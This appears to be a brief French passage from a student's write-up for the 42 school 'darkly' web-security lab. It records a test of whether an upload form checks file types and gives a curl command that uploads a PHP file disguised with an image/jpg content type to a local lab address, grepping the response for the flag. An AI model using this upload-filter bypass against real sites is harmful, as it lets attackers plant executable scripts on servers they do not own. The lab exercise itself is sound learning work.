...
Pour ce faire, on test si l'upload vérifie bien le type de fichier envoyé en envoyant un script bidon en html ou php.
Ca ne marche pas. 
...
curl -X POST -F 'uploaded=@/Users/morganealbanese/Desktop/42/Projet/darkly/rendu/bidon.php;type=image/jpg' -F 'MAX_FILE_SIZE=100000' -F 'Upload=Upload' 'http://192.168.43.114/index.php?page=upload' | grep 'flag'
